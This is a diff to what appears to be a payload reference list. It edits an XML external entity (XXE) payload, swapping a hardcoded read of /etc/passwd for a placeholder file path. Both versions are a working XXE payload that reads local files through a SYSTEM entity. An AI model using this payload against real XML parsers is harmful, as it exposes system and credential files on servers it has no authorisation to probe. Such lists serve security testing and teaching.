@@ -4,9 +4,9 @@
 
 ## Payloads
 
-Show /etc/passwd.
+Show a file.
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file://[PATHTOFILE]'>]>
 <root>&read;</root>
 ```
